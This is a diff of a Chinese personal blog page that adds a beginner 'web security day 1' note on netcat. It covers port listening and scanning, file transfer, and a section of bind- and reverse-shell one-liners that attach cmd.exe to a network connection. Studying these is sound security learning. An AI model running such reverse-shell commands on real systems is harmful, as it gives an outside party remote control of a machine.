@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>学习计划 | frozenfish</title>
+  <title>web安全day1 | frozenfish</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="article">
-<meta property="og:title" content="学习计划">
-<meta property="og:url" content="http://example.com/2023/12/11/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/index.html">
+  <meta name="description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全day1">
+<meta property="og:url" content="http://example.com/2023/12/15/web%E5%AE%89%E5%85%A8day1/index.html">
 <meta property="og:site_name" content="frozenfish">
+<meta property="og:description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-12-11T13:14:40.000Z">
-<meta property="article:modified_time" content="2023-12-11T13:14:40.083Z">
+<meta property="article:published_time" content="2023-12-15T15:47:33.000Z">
+<meta property="article:modified_time" content="2023-12-15T15:52:33.349Z">
 <meta property="article:author" content="frozenfish">
 <meta name="twitter:card" content="summary">
   
@@ -240,14 +242,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="plan-学习计划" class="article article-type-plan " itemscope itemprop="blogPost">
+            <article id="post-web安全day1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      学习计划
+      web安全day1
     </h1>
   
 
@@ -259,8 +261,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2023/12/11/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/" class="archive-article-date">
-        <time datetime="2023-12-11T13:14:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-11</time>
+<a href="/2023/12/15/web%E5%AE%89%E5%85%A8day1/" class="archive-article-date">
+        <time datetime="2023-12-15T15:47:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-15</time>
 </a>
 
   
@@ -273,7 +275,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">0字</span>
+      <span class="post-count">713字</span>
     </span>
   </span>
 
@@ -282,7 +284,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">2分</span>
     </span>
   </span>
 </div>
@@ -293,7 +295,59 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <h1 id="1-Nc瑞士军刀使用详解"><a href="#1-Nc瑞士军刀使用详解" class="headerlink" title="1.Nc瑞士军刀使用详解"></a>1.Nc瑞士军刀使用详解</h1><h2 id="1-tcp监听"><a href="#1-tcp监听" class="headerlink" title="1.tcp监听"></a>1.tcp监听</h2><pre><code>tcp监听
+nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口
+nc -l -p 9999
+客户端测试
+1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口
+telnet 10.0.1.161 9999
+2、B机器上也可以使用nmap扫描A机器的此端口
+nmap 10.0.1.161 -p9999
+3、使用nc命令作为客户端工具进行端口探测
+nc -vz -w 2 10.0.1.161 9999
+（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）
+服务端会自动关闭监听。
+4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固
+在客户端B机器上扫描连续的两个端口，如下
+nc -vzw 2 10.0.1.161 9998-9999
+</code></pre>
+<h2 id="2-传文件"><a href="#2-传文件" class="headerlink" title="2.传文件"></a>2.传文件</h2><pre><code>方法1，先启动接收命令
+使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了
+把A机器上的一个rpm文件发送到B机器上
+需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 
+步骤1，先在B机器上启动一个接收文件的监听，格式如下
+意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）
+格式：nc -l port &gt;file
+nc -l -p 9995 &gt;zabbix.rpm
+步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去
+nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm
+方法2，先启动发送命令
+步骤1，先在B机器上，启动发送文件命令
+下面命令表示通过本地的9992端口发送test.mv文件
+nc -l -p 9992 &lt;test.mv
+步骤2，A机器上连接B机器，取接收文件
+下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv
+nc 10.0.1.162 9992 &gt;test2.mv
+</code></pre>
+<h2 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h2><pre><code>方法1、REMOTE主机绑定SHELL
+在公网监听
+nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe
+或者
+nc -l -p 5555 -t -e cmd.exe
+在内网主动建立连接
+nc -nvv 192.168.153.138 5555
+-t是通过telne模式执行 cmd.exe 程序，可以省略。
+讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
+方法2、REMOTE主机绑定SHELL并反向连接
+在公网监听
+nc -lp 5555
+在内网机器反弹
+nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
+或者
+nc -t -e cmd 192.168.153.140 5555
+讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
+</code></pre>
+<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1>
     
 
     
@@ -354,7 +408,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/12/11/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/12/15/web%E5%AE%89%E5%85%A8day1/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -398,7 +452,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Nc%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">1.Nc瑞士军刀使用详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-tcp%E7%9B%91%E5%90%AC"><span class="toc-number">1.1.</span> <span class="toc-text">1.tcp监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">2.传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-nc%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">3.nc反弹shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-number">2.</span> <span class="toc-text">2.加解密</span></a></li></ol>
                     </div>
                 </span>
             </div>
